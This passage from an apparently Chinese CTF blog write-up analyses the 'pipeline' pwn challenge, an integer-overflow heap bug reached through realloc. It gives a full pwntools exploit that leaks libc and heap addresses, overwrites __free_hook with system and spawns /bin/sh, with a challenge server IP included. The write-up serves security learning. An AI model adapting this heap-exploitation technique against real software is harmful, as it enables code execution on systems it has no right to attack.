<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pipeline: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">1660</span>ac5f889c59866adfdd8ab506d59e2951e03a, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>程序对 size 大小有检查：（导致不能使用 mmap 进行分配）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunkg = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">*chunkg = chunkg + <span class="number">2</span>;</span><br><span class="line">chunkg[<span class="number">1</span>] = <span class="number">0x21000</span>LL;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a1 &lt; *chunkg || (result = *chunkg + chunkg[<span class="number">1</span>], a1 &gt;= result) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序对 offset 也有检查：（导致 offset 不能为负数）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)chunk-&gt;offset &gt;= chunk-&gt;size || (chunk-&gt;offset &amp; <span class="number">0x80000000</span>) != <span class="number">0</span> )</span><br><span class="line">  chunk-&gt;offset = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>整数溢出导致堆溢出：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">size2 = chunk-&gt;size - chunk-&gt;offset;</span><br><span class="line"><span class="keyword">if</span> ( size &lt;= size2 )</span><br><span class="line">  LOWORD(size2) = size;</span><br><span class="line">readn((__int64)chunk-&gt;data + (<span class="built_in">int</span>)chunk-&gt;offset, (__int16)size2);</span><br></pre></td></tr></table></figure>
<ul>
<li>chunk-&gt;offset 是 unsigned int 类型，但 readn 中将其识别为 int </li>
<li>在 <code>LOWORD(size2) = size</code> 中，4字节的 size2 只有低2字节被覆盖，可能导致堆溢出</li>
<li>如果我们输入 0x80000200（负数），程序就会进入 if 语句，但最终只有 0x200 被覆盖到 size2</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>程序没有 free，只有一个 realloc 可以利用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt;offset = input_num(<span class="string">&quot;offset: &quot;</span>);</span><br><span class="line">chunk-&gt;size = input_num(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">chunk-&gt;data = realloc_s(chunk-&gt;data, chunk-&gt;size);</span><br></pre></td></tr></table></figure>
<p>申请一个大堆块，然后 realloc 一个更大的堆块，配合堆风水就可以泄露 libc_base 和 heap_base</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">add()<span class="comment">#0</span></span><br><span class="line">add()<span class="comment">#1</span></span><br><span class="line">add()<span class="comment">#2</span></span><br><span class="line">add()<span class="comment">#3</span></span><br><span class="line">add()<span class="comment">#4</span></span><br><span class="line">add2(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x450</span>)</span><br><span class="line">add()<span class="comment">#5</span></span><br><span class="line">add2(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x460</span>)</span><br><span class="line">add2(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add2(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ebfe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add2(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add2(<span class="number">3</span>,<span class="number">0</span>,<span class="number">0x430</span>)</span><br><span class="line">add2(<span class="number">4</span>,<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">ru(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;aaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x7d0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<p>由于程序的限制不能直接劫持 tcache，因此需要劫持程序的单链表结构，然后直接修改 free_hook 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pipeline1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x188A)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>():</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span>(<span class="params">index,offset,size</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(offset) == <span class="built_in">int</span>:</span><br><span class="line">        sla(<span class="string">&quot;offset: &quot;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;offset: &quot;</span>,offset)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(size) == <span class="built_in">int</span>:</span><br><span class="line">        sla(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;size: &quot;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,data</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(size) == <span class="built_in">int</span>:</span><br><span class="line">        sla(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;size: &quot;</span>,size)</span><br><span class="line">    sla(<span class="string">&quot;data: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add()<span class="comment">#0</span></span><br><span class="line">add()<span class="comment">#1</span></span><br><span class="line">add()<span class="comment">#2</span></span><br><span class="line">add()<span class="comment">#3</span></span><br><span class="line">add()<span class="comment">#4</span></span><br><span class="line">add2(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x450</span>)</span><br><span class="line">add()<span class="comment">#5</span></span><br><span class="line">add2(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x460</span>)</span><br><span class="line">add2(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add2(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ebfe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add2(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add2(<span class="number">3</span>,<span class="number">0</span>,<span class="number">0x430</span>)</span><br><span class="line">add2(<span class="number">4</span>,<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">ru(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;aaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x7d0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add()<span class="comment">#6</span></span><br><span class="line">add2(<span class="number">6</span>,<span class="number">0</span>,<span class="number">0x3f0</span>)</span><br><span class="line">add2(<span class="number">5</span>,<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">add()<span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x108</span>+p64(<span class="number">0x21</span>)+p64(free_hook-<span class="number">0x8</span>)+p64(<span class="number">0x50000000000</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">&quot;-2147483136&quot;</span>,payload)</span><br><span class="line">payload = <span class="string">&quot;/bin/sh\x00&quot;</span> + p64(system)</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0x20</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add2(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

    </div>

    
    
    

      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/off-by-one/" rel="tag"><i class="fa fa-tag"></i> off-by-one</a>
              <a href="/tags/ORW/" rel="tag"><i class="fa fa-tag"></i> ORW</a>
              <a href="/tags/shellcode/" rel="tag"><i class="fa fa-tag"></i> shellcode</a>
              <a href="/tags/exit-hook/" rel="tag"><i class="fa fa-tag"></i> exit_hook</a>
              <a href="/tags/ret2dlresolve/" rel="tag"><i class="fa fa-tag"></i> ret2dlresolve</a>
              <a href="/tags/musl/" rel="tag"><i class="fa fa-tag"></i> musl</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/06/28/CIVC%E8%BD%A6%E8%81%94%E7%BD%912023/" rel="prev" title="CIVC车联网2023">
      <i class="fa fa-chevron-left"></i> CIVC车联网2023
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/07/13/CMPT379%E7%BC%96%E8%AF%91%E5%99%A8Lab3%EF%BC%9Adecafexpr/" rel="next" title="CMPT379编译器Lab3：decafexpr">
      CMPT379编译器Lab3：decafexpr <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#no-output"><span class="nav-number">1.</span> <span class="nav-text">no_output</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#orw"><span class="nav-number">2.</span> <span class="nav-text">orw</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode"><span class="nav-number">3.</span> <span class="nav-text">shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-diary"><span class="nav-number">4.</span> <span class="nav-text">baby_diary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babypwn"><span class="nav-number">5.</span> <span class="nav-text">babypwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyheap"><span class="nav-number">6.</span> <span class="nav-text">easyheap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easywarm"><span class="nav-number">7.</span> <span class="nav-text">easywarm</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pipeline"><span class="nav-number">8.</span> <span class="nav-text">pipeline</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">331</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">170</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">74:46</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
